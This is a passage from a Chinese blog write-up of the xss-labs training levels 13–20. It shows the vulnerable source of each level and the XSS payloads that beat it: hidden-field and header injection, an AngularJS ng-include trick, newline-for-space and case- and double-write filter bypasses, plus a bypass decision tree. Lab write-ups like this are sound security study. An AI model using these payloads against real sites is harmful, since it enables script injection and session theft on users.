+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_cook&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么 Cookie 比 Referer 和 UA 更方便？</strong> 因为 Cookie 是浏览器本地存储的，你可以直接在 F12 里修改，不需要每次请求都拦截。而 Referer 和 UA 是浏览器自动生成的，每次请求都会重新设置，所以必须用 Burp Suite 拦截修改。</p>
+<h3 id="Level-10-13-四关对比：同一套路，四个入口"><a href="#Level-10-13-四关对比：同一套路，四个入口" class="headerlink" title="Level 10-13 四关对比：同一套路，四个入口"></a>Level 10-13 四关对比：同一套路，四个入口</h3><table>
+<thead>
+<tr>
+<th>关卡</th>
+<th>注入来源</th>
+<th>隐藏字段</th>
+<th>过滤方式</th>
+<th>修改工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Level 10</td>
+<td>URL 参数 <code>?t_sort=</code></td>
+<td><code>t_sort</code></td>
+<td><code>&lt;&gt;</code> 删除</td>
+<td>直接改 URL</td>
+</tr>
+<tr>
+<td>Level 11</td>
+<td>Referer 请求头</td>
+<td><code>t_ref</code></td>
+<td><code>htmlspecialchars()</code></td>
+<td>Burp Suite</td>
+</tr>
+<tr>
+<td>Level 12</td>
+<td>User-Agent 请求头</td>
+<td><code>t_ua</code></td>
+<td><code>&lt;&gt;</code> 删除</td>
+<td>Burp Suite</td>
+</tr>
+<tr>
+<td>Level 13</td>
+<td>Cookie 请求头</td>
+<td><code>t_cook</code></td>
+<td><code>&lt;&gt;</code> 删除</td>
+<td><strong>F12 &#x2F; Burp Suite</strong></td>
+</tr>
+</tbody></table>
+<p><strong>核心思路完全一样：</strong> 闭合 <code>value</code> → 加事件属性 → 覆盖 <code>type=&quot;hidden&quot;</code>。四道题本质上是同一道题，只是换了四个不同的入口。</p>
+<hr>
+<h2 id="十五、Level-14-——-外部依赖失效（跳过）"><a href="#十五、Level-14-——-外部依赖失效（跳过）" class="headerlink" title="十五、Level 14 —— 外部依赖失效（跳过）"></a>十五、Level 14 —— 外部依赖失效（跳过）</h2><p>Level 14 的页面用 <code>&lt;iframe&gt;</code> 嵌入了外部网站 <code>http://www.exifviewer.org/</code>，这个第三方 EXIF 查看服务已经关停，导致页面无法正常加载，整关直接废了。</p>
+<p><strong>这关本来考什么？</strong> EXIF XSS——把恶意 JS 代码写进图片的 EXIF 元数据里，当图片查看器读取 EXIF 信息时触发 XSS。大多数通关教程都是直接跳过的。</p>
+<hr>
+<h2 id="十六、Level-15-——-AngularJS-ng-include-注入"><a href="#十六、Level-15-——-AngularJS-ng-include-注入" class="headerlink" title="十六、Level 15 —— AngularJS ng-include 注入"></a>十六、Level 15 —— AngularJS ng-include 注入</h2><h3 id="新场景-4"><a href="#新场景-4" class="headerlink" title="新场景"></a>新场景</h3><p>Level 15 引入了全新的东西——<strong>AngularJS 框架</strong>！</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">ng-app</span>&gt;</span>                          <span class="comment">&lt;!-- ← AngularJS 应用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  <span class="comment">&lt;!-- ← 引入了 AngularJS --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>源码关键部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="🆕-新概念：AngularJS-和-ng-include"><a href="#🆕-新概念：AngularJS-和-ng-include" class="headerlink" title="🆕 新概念：AngularJS 和 ng-include"></a>🆕 新概念：AngularJS 和 ng-include</h3><p><strong>AngularJS</strong> 是 Google 开发的前端框架，<code>ng-include</code> 是它的一个指令，作用是<strong>把另一个页面的 HTML 内容加载进来</strong>，就像前端的 <code>include</code>。</p>
+<p>注入点就是 URL 参数 <code>src</code>——不传就是空的，传了就会被拼进 <code>ng-include</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 不传 src --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;ng-include:&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 传 ?src=&#x27;level1.php&#x27; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;ng-include:&#x27;level1.php&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- AngularJS 会把 level1.php 的内容加载进来！ --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤规则-5"><a href="#过滤规则-5" class="headerlink" title="过滤规则"></a>过滤规则</h3><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>处理结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;</code> <code>&gt;</code></td>
+<td>转义为 <code>&amp;lt;</code> <code>&amp;gt;</code>（<code>htmlspecialchars()</code>）</td>
+</tr>
+<tr>
+<td><code>&quot;</code></td>
+<td>转义为 <code>&amp;quot;</code></td>
+</tr>
+</tbody></table>
+<h3 id="关键发现：转义了也没关系！"><a href="#关键发现：转义了也没关系！" class="headerlink" title="关键发现：转义了也没关系！"></a>关键发现：转义了也没关系！</h3><p>之前遇到 <code>htmlspecialchars()</code> 转义 <code>&lt;&gt;</code>，我们都没法用标签。但这次不一样——<strong><code>&lt;&gt;</code> 在属性值里，浏览器会自动还原！</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP 输出：  ng-include:&#x27;level1.php?keyword=&amp;lt;img src=1 onerror=alert(1)&amp;gt;&#x27;</span><br><span class="line">浏览器解析属性值时自动还原：  ng-include:&#x27;level1.php?keyword=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="⚠️-关键限制：ng-include-不执行-标签"><a href="#⚠️-关键限制：ng-include-不执行-标签" class="headerlink" title="⚠️ 关键限制：ng-include 不执行 &lt;script&gt; 标签"></a>⚠️ 关键限制：ng-include 不执行 <code>&lt;script&gt;</code> 标签</h3><p><code>ng-include</code> 加载 HTML 时会<strong>跳过 <code>&lt;script&gt;</code> 标签</strong>，这是 AngularJS 的安全机制。但<strong>事件属性可以执行</strong>！</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>ng-include 中能否执行？</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>❌ AngularJS 安全机制禁止</td>
+</tr>
+<tr>
+<td><code>&lt;img src=1 onerror=alert(1)&gt;</code></td>
+<td>✅ 事件属性可以执行</td>
+</tr>
+<tr>
+<td><code>&lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code></td>
+<td>✅ 需要点击，但可以执行</td>
+</tr>
+</tbody></table>
+<h3 id="解法：包含-Level-1-并传入-XSS-payload"><a href="#解法：包含-Level-1-并传入-XSS-payload" class="headerlink" title="解法：包含 Level 1 并传入 XSS payload"></a>解法：包含 Level 1 并传入 XSS payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=&lt;img src=0 onmouseover=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者用 <code>onerror</code> 零交互弹框：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=&lt;img src=0 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="执行流程-1"><a href="#执行流程-1" class="headerlink" title="执行流程"></a>执行流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 你输入：?src=&#x27;level1.php?name=&lt;img src=0 onerror=alert(1)&gt;&#x27;</span><br><span class="line"></span><br><span class="line">2. htmlspecialchars() 转义后输出到 HTML 属性值中</span><br><span class="line"></span><br><span class="line">3. 浏览器解析属性值时自动还原 &lt;&gt;</span><br><span class="line"></span><br><span class="line">4. AngularJS 读取 ng-include 的值，请求 level1.php?name=&lt;img src=0 onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">5. Level 1 不做任何过滤，渲染出 &lt;img&gt; 标签</span><br><span class="line"></span><br><span class="line">6. 图片 src=0 加载失败 → onerror 触发 → 弹框！🎉</span><br></pre></td></tr></table></figure>
+
+<h3 id="踩坑记录-3"><a href="#踩坑记录-3" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ol>
+<li><strong><code>&lt;script&gt;</code> 不行</strong>：ng-include 不执行 script 标签，必须用事件属性</li>
+<li><strong>路径要用相对路径</strong>：<code>&#39;level1.php&#39;</code> ✅，<code>&#39;127.0.0.1:8888/level1.php&#39;</code> ❌，<code>&#39;http://127.0.0.1:8888/level1.php&#39;</code> ❌（跨域限制）</li>
+<li><strong>参数名要对</strong>：Level 1 的参数是 <code>name</code>，不是 <code>keyword</code>（不同关卡参数名不同）</li>
+<li><strong>单引号不能少</strong>：<code>&#39;level1.php&#39;</code> 告诉 AngularJS 这是字符串 URL，不是表达式</li>
+</ol>
+<h3 id="AngularJS-是什么？"><a href="#AngularJS-是什么？" class="headerlink" title="AngularJS 是什么？"></a>AngularJS 是什么？</h3><p>AngularJS 是 Google 开发的前端框架，核心特性：</p>
+<ul>
+<li><strong>数据绑定</strong>：<code>&#123;&#123;变量名&#125;&#125;</code> 自动显示数据</li>
+<li><strong>指令</strong>：以 <code>ng-</code> 开头的特殊属性，扩展 HTML 功能</li>
+<li><strong>依赖注入</strong>：自动管理模块之间的依赖</li>
+</ul>
+<p>AngularJS（1.x）已经停止维护，现在 Google 推的是 Angular（2+，完全重写）。但很多老项目还在用，所以这类漏洞在实战中仍然常见。</p>
+<h3 id="属性值中-转义-vs-文本内容中-转义"><a href="#属性值中-转义-vs-文本内容中-转义" class="headerlink" title="属性值中 &lt;&gt; 转义 vs 文本内容中 &lt;&gt; 转义"></a>属性值中 <code>&lt;&gt;</code> 转义 vs 文本内容中 <code>&lt;&gt;</code> 转义</h3><table>
+<thead>
+<tr>
+<th>场景</th>
+<th><code>&amp;lt;</code> <code>&amp;gt;</code> 能还原吗？</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>在<strong>文本内容</strong>中（<code>&lt;h2&gt;</code>、<code>&lt;p&gt;</code>）</td>
+<td>❌ 只是显示文字</td>
+<td>文本里的实体不会变成标签</td>
+</tr>
+<tr>
+<td>在<strong>属性值</strong>中（<code>class=&quot;...&quot;</code>、<code>value=&quot;...&quot;</code>）</td>
+<td>✅ 浏览器自动还原</td>
+<td>属性值里的实体会被解码</td>
+</tr>
+</tbody></table>
+<p>这就是为什么 Level 15 的 <code>htmlspecialchars()</code> 转义了 <code>&lt;&gt;</code> 也没关系——它们在属性值里，浏览器会自动还原！</p>
+<hr>
+<h2 id="十七、Level-16-——-空格过滤绕过"><a href="#十七、Level-16-——-空格过滤绕过" class="headerlink" title="十七、Level 16 —— 空格过滤绕过"></a>十七、Level 16 —— 空格过滤绕过</h2><h3 id="新场景-5"><a href="#新场景-5" class="headerlink" title="新场景"></a>新场景</h3><p>Level 16 的过滤规则更狠了：</p>
+<table>
+<thead>
+<tr>
+<th>被过滤的内容</th>
+<th>处理方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>script</code></td>
+<td>被替换&#x2F;删除</td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td>被替换&#x2F;删除</td>
+</tr>
+<tr>
+<td><strong>空格</strong></td>
+<td>被替换为 <code>&amp;nbsp;</code></td>
+</tr>
+</tbody></table>
+<h3 id="💡-核心思路"><a href="#💡-核心思路" class="headerlink" title="💡 核心思路"></a>💡 核心思路</h3><ol>
+<li><code>&lt;script&gt;</code> 被过滤 → 用别的标签（<code>&lt;img&gt;</code>、<code>&lt;svg&gt;</code> 等）</li>
+<li><code>/</code> 被过滤 → 不用 <code>&lt;/script&gt;</code> 闭合（反正也不用 script 了）</li>
+<li><strong>空格被过滤</strong> → 用换行符 <code>%0a</code> 代替空格！</li>
+</ol>
+<h3 id="🆕-为什么-0a-可以代替空格？"><a href="#🆕-为什么-0a-可以代替空格？" class="headerlink" title="🆕 为什么 %0a 可以代替空格？"></a>🆕 为什么 <code>%0a</code> 可以代替空格？</h3><p><code>%0a</code> 是<strong>换行符</strong>（LF）的 URL 编码。在 HTML 中，换行符和空格一样，都能起到<strong>分隔属性</strong>的作用：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这两种写法等价 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;img%0asrc=x%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>浏览器解析 HTML 时，换行符、Tab、空格都是”空白字符”，都会被当作属性分隔符。</p>
+<h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><p>用 <code>&lt;svg&gt;</code> 标签 + <code>%0a</code> 代替空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者用 <code>&lt;img&gt;</code> 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0asrc=x%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;svg&gt;</code> 更短更好用，因为 <code>onload</code> 加载就触发，不需要故意制造错误，也不需要 <code>src</code> 属性。</p>
+<h3 id="可以代替空格的字符"><a href="#可以代替空格的字符" class="headerlink" title="可以代替空格的字符"></a>可以代替空格的字符</h3><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>URL 编码</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>换行符</td>
+<td><code>%0a</code></td>
+<td>✅ 最常用</td>
+</tr>
+<tr>
+<td>回车符</td>
+<td><code>%0d</code></td>
+<td>✅ 也可以</td>
+</tr>
+<tr>
+<td>Tab</td>
+<td><code>%09</code></td>
+<td>✅ 也可以</td>
+</tr>
+</tbody></table>
+<h3 id="踩坑记录-4"><a href="#踩坑记录-4" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><p><code>/</code> 被过滤了，所以 <code>&lt;/svg&gt;</code>、<code>/&gt;</code> 这种写法都会被破坏。不过 XSS 不需要闭合标签，越短越好！</p>
+<hr>
+<h2 id="十八、Level-17-20-——-Flash-已淘汰（跳过）"><a href="#十八、Level-17-20-——-Flash-已淘汰（跳过）" class="headerlink" title="十八、Level 17-20 —— Flash 已淘汰（跳过）"></a>十八、Level 17-20 —— Flash 已淘汰（跳过）</h2><p>Level 17-20 都涉及 <strong>Flash 插件</strong>（<code>&lt;embed&gt;</code> 标签），但 Flash 在 2020 年已经被所有主流浏览器<strong>彻底淘汰</strong>，页面会显示”该插件不受支持”，无法正常完成。</p>
+<h3 id="这几关本来考什么？"><a href="#这几关本来考什么？" class="headerlink" title="这几关本来考什么？"></a>这几关本来考什么？</h3><p>Level 17 的核心漏洞是 <code>&lt;embed&gt;</code> 标签的 <code>src</code> 属性没有引号，用户可以通过 URL 参数直接追加事件属性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>注入后：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">ab</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>思路和之前一样——闭合&#x2F;追加属性，注入事件。只是因为 Flash 不存在了，没法实际触发弹框。</p>
+<h3 id="关于-Flash"><a href="#关于-Flash" class="headerlink" title="关于 Flash"></a>关于 Flash</h3><p>Flash（Adobe Flash Player）曾经是网页动画、视频、游戏的标准插件，但因为安全漏洞频出，2020 年 12 月 31 日被 Adobe 正式停止支持，所有主流浏览器都移除了 Flash 支持。现在 Flash 相关的 XSS 在实战中已经没有意义了。</p>
+<hr>
+<h2 id="十九、总结"><a href="#十九、总结" class="headerlink" title="十九、总结"></a>十九、总结</h2><h3 id="各关卡对比"><a href="#各关卡对比" class="headerlink" title="各关卡对比"></a>各关卡对比</h3><table>
+<thead>
+<tr>
+<th>关卡</th>
+<th>过滤方式</th>
+<th>绕过方法</th>
+<th>核心思路</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Level 1</td>
+<td>无过滤</td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>直接注入</td>
+</tr>
+<tr>
+<td>Level 2</td>
+<td>无过滤，但在value里</td>
+<td><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>闭合引号逃出去</td>
+</tr>
+<tr>
+<td>Level 3</td>
+<td><code>&lt;&gt;</code>转义 + <code>&quot;</code>过滤</td>
+<td><code>&#39; onmouseover=&#39;alert(1)</code></td>
+<td>事件属性绕过</td>
+</tr>
+<tr>
+<td>Level 4</td>
+<td><code>&lt;&gt;</code>删除</td>
+<td><code>&quot; onmouseover=&quot;alert(1)</code></td>
+<td>事件属性绕过</td>
+</tr>
+<tr>
+<td>Level 5</td>
+<td><code>script</code> + <code>on</code> 过滤</td>
+<td><code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code></td>
+<td>javascript伪协议</td>
+</tr>
+<tr>
+<td>Level 6</td>
+<td>同上 + <code>href</code>过滤（区分大小写）</td>
+<td><code>&quot;&gt;&lt;a hREF=javascript:alert(1)&gt;hack&lt;/a&gt;</code></td>
+<td>大小写绕过</td>
+</tr>
+<tr>
+<td>Level 7</td>
+<td><code>script</code>删除（只删一次）</td>
+<td><code>&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;</code></td>
+<td>双写绕过</td>
+</tr>
+<tr>
+<td>Level 8</td>
+<td>多关键词过滤 + htmlspecialchars</td>
+<td><code>javascr&amp;#x69;pt:alert(1)</code></td>
+<td>HTML实体编码绕过</td>
+</tr>
+<tr>
+<td>Level 9</td>
+<td>必须包含 <code>http://</code> 检测</td>
+<td><code>javascr&amp;#x69;pt:alert(1)//http://</code></td>
+<td>JS 注释绕过检测</td>
+</tr>
+<tr>
+<td>Level 10</td>
+<td>隐藏字段 + <code>&lt;&gt;</code>删除</td>
+<td><code>&quot; onmouseover=javascript:alert(1) type=&quot;</code></td>
+<td>URL参数注入隐藏字段</td>
+</tr>
+<tr>
+<td>Level 11</td>
+<td>Referer注入 + <code>&lt;&gt;</code>删除</td>
+<td>Burp改Referer: <code>&quot; type=&quot;text&quot; onfocus=... autofocus=&quot;</code></td>
+<td>Referer请求头注入</td>
+</tr>
+<tr>
+<td>Level 12</td>
+<td>User-Agent注入 + <code>&lt;&gt;</code>删除</td>
+<td>Burp改UA: <code>&quot; onmouseover=javascript:alert(1) type &quot;</code></td>
+<td>User-Agent请求头注入</td>
+</tr>
+<tr>
+<td>Level 13</td>
+<td>Cookie注入 + <code>&lt;&gt;</code>删除</td>
+<td>F12改Cookie: <code>&quot; onmouseover=javascript:alert(1) type=&quot;</code></td>
+<td>Cookie请求头注入</td>
+</tr>
+<tr>
+<td>Level 14</td>
+<td>外部依赖失效</td>
+<td>跳过</td>
+<td>EXIF XSS（外部网站已关停）</td>
+</tr>
+<tr>
+<td>Level 15</td>
+<td>AngularJS + <code>htmlspecialchars()</code></td>
+<td><code>?src=&#39;level1.php?name=&lt;img src=0 onerror=alert(1)&gt;&#39;</code></td>
+<td>ng-include包含注入</td>
+</tr>
+<tr>
+<td>Level 16</td>
+<td>空格+script+&#x2F;过滤</td>
+<td><code>&lt;svg%0aonload=alert(1)&gt;</code></td>
+<td>换行符代替空格</td>
+</tr>
+<tr>
+<td>Level 17-20</td>
+<td>Flash相关</td>
+<td>跳过</td>
+<td>Flash已淘汰，无法完成</td>
+</tr>
+</tbody></table>
+<h3 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h3><ol>
+<li><strong>学会看源代码</strong>：很多关键信息藏在源代码里，页面上看不到的东西在源代码里一目了然。</li>
+<li><strong>理解HTML结构</strong>：知道标签、属性、引号的关系，才能知道怎么”逃出去”。</li>
+<li><strong>思路要灵活</strong>：<code>&lt;script&gt;</code>不行就换事件属性，事件属性不行就换<code>javascript:</code>伪协议，总有一条路能走通。</li>
+<li><strong>XSS的本质</strong>：服务器没有对用户输入做充分处理就放进HTML页面，浏览器分不清哪些是网站写的、哪些是用户塞的，统统执行。</li>
+<li><strong>属性值里的HTML实体会被还原</strong>：<code>htmlspecialchars()</code> 转义的 <code>&lt;&gt;</code> 在属性值中会被浏览器自动还原，在文本内容中则不会。这个区别在 Level 15 中非常关键。</li>
+<li><strong>空格不是唯一选择</strong>：HTML 中换行符（<code>%0a</code>）、Tab（<code>%09</code>）都能代替空格分隔属性，在空格被过滤时很有用。</li>
+<li><strong>注入点不只是输入框</strong>：URL 参数、HTTP 请求头（Referer、User-Agent、Cookie）、AngularJS 的 ng-include 指令，都可能成为 XSS 的入口。</li>
+</ol>
+<h3 id="学到的绕过技巧汇总"><a href="#学到的绕过技巧汇总" class="headerlink" title="学到的绕过技巧汇总"></a>学到的绕过技巧汇总</h3><table>
+<thead>
+<tr>
+<th>绕过方法</th>
+<th>适用场景</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>闭合引号</td>
+<td>payload在属性值里</td>
+<td><code>&quot;&gt;</code> 逃出value属性</td>
+</tr>
+<tr>
+<td>事件属性</td>
+<td><code>&lt;script&gt;</code>被过滤</td>
+<td><code>onmouseover</code>、<code>onerror</code>等</td>
+</tr>
+<tr>
+<td>javascript伪协议</td>
+<td>事件属性也被过滤</td>
+<td><code>href=javascript:alert(1)</code></td>
+</tr>
+<tr>
+<td>大小写混淆</td>
+<td>过滤区分大小写</td>
+<td><code>scRipt</code>、<code>hREF</code>、<code>ONerror</code></td>
+</tr>
+<tr>
+<td>双写绕过</td>
+<td>关键词只删一次</td>
+<td><code>scscriptript</code> → <code>script</code></td>
+</tr>
+<tr>
+<td>HTML实体编码</td>
+<td>关键词被过滤</td>
+<td><code>&amp;#x69;</code> → <code>i</code>，打断关键词</td>
+</tr>
+<tr>
+<td>JS注释绕过</td>
+<td>必须包含某字符串检测</td>
+<td><code>//http://</code> 骗过检测但不执行</td>
+</tr>
+<tr>
+<td>URL参数注入</td>
+<td>隐藏字段（type&#x3D;hidden）</td>
+<td><code>?t_sort=&quot; onmouseover=...</code></td>
+</tr>
+<tr>
+<td>Referer请求头注入</td>
+<td>值来自Referer而非URL参数</td>
+<td>Burp改Referer注入</td>
+</tr>
+<tr>
+<td>User-Agent请求头注入</td>
+<td>值来自UA而非URL参数</td>
+<td>Burp改User-Agent注入</td>
+</tr>
+<tr>
+<td>Cookie请求头注入</td>
+<td>值来自Cookie而非URL参数</td>
+<td>F12&#x2F;Burp改Cookie注入</td>
+</tr>
+<tr>
+<td>ng-include包含注入</td>
+<td>AngularJS框架，ng-include可加载外部页面</td>
+<td><code>?src=&#39;level1.php?name=&lt;img onerror=...&gt;&#39;</code></td>
+</tr>
+<tr>
+<td>换行符代替空格</td>
+<td>空格被过滤</td>
+<td><code>%0a</code>（换行符）代替空格分隔属性</td>
+</tr>
+</tbody></table>
+<h3 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h3><h3 id="XSS-攻击思路决策树"><a href="#XSS-攻击思路决策树" class="headerlink" title="XSS 攻击思路决策树"></a>XSS 攻击思路决策树</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">               用户输入点</span><br><span class="line">                   │</span><br><span class="line">       ┌───────────┼───────────┐</span><br><span class="line">       │           │           │</span><br><span class="line">   URL 参数    HTTP 请求头    前端框架</span><br><span class="line">       │           │           │</span><br><span class="line">直接注入？    Burp Suite    AngularJS</span><br><span class="line">       │       修改请求头    ng-include</span><br><span class="line">       │           │           │</span><br><span class="line">       └───────────┼───────────┘</span><br><span class="line">                   │</span><br><span class="line">              尝试 &lt;script&gt;</span><br><span class="line">                   │</span><br><span class="line">            ┌──── 被过滤？────┐</span><br><span class="line">            │                 │</span><br><span class="line">           否 → 弹框成功！    是</span><br><span class="line">                              │</span><br><span class="line">                   ┌──────────┤</span><br><span class="line">                   │          │</span><br><span class="line">              事件属性可用？  事件也被过滤？</span><br><span class="line">                   │          │</span><br><span class="line">                  是 → 用      否 → javascript: 伪协议</span><br><span class="line">             onerror/onfocus          │</span><br><span class="line">             onmouseover/onload  ┌─── 被过滤？───┐</span><br><span class="line">                                │               │</span><br><span class="line">                               否 → 弹框！      是</span><br><span class="line">                                                │</span><br><span class="line">                                     ┌──────────┤</span><br><span class="line">                                     │          │</span><br><span class="line">                                大小写绕过    双写绕过</span><br><span class="line">                                (区分大小写)  (只删一次)</span><br><span class="line">                                     │          │</span><br><span class="line">                                ┌────┴────┐</span><br><span class="line">                                │         │</span><br><span class="line">                             还不行？   HTML实体编码</span><br><span class="line">                                │         │</span><br><span class="line">                             换标签      &amp;#x69; 打断关键词</span><br><span class="line">                             &lt;img&gt;       │</span><br><span class="line">                             &lt;svg&gt;    还不行？</span><br><span class="line">                             &lt;body&gt;      │</span><br><span class="line">                                    换注入点</span><br><span class="line">                                    HTTP请求头</span><br><span class="line">                                    ng-include</span><br></pre></td></tr></table></figure>
+
+<h3 id="xss-labs-通关总结"><a href="#xss-labs-通关总结" class="headerlink" title="xss-labs 通关总结"></a>xss-labs 通关总结</h3><p>xss-labs 共 20 关，其中：</p>
+<table>
+<thead>
+<tr>
+<th>关卡范围</th>
+<th>状态</th>
+<th>核心考点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Level 1-7</td>
+<td>✅ 全部通关</td>
+<td>基础绕过：闭合引号、事件属性、伪协议、大小写、双写</td>
+</tr>
+<tr>
+<td>Level 8-9</td>
+<td>✅ 全部通关</td>
+<td>HTML 实体编码、JS 注释绕过检测</td>
+</tr>
+<tr>
+<td>Level 10-13</td>
+<td>✅ 全部通关</td>
+<td>隐藏字段注入、HTTP 请求头注入</td>
+</tr>
+<tr>
+<td>Level 14</td>
+<td>❌ 跳过</td>
+<td>外部依赖失效（EXIF 查看网站已关停）</td>
+</tr>
+<tr>
+<td>Level 15</td>
+<td>✅ 通关</td>
+<td>AngularJS ng-include 注入</td>
+</tr>
+<tr>
+<td>Level 16</td>
+<td>✅ 通关</td>
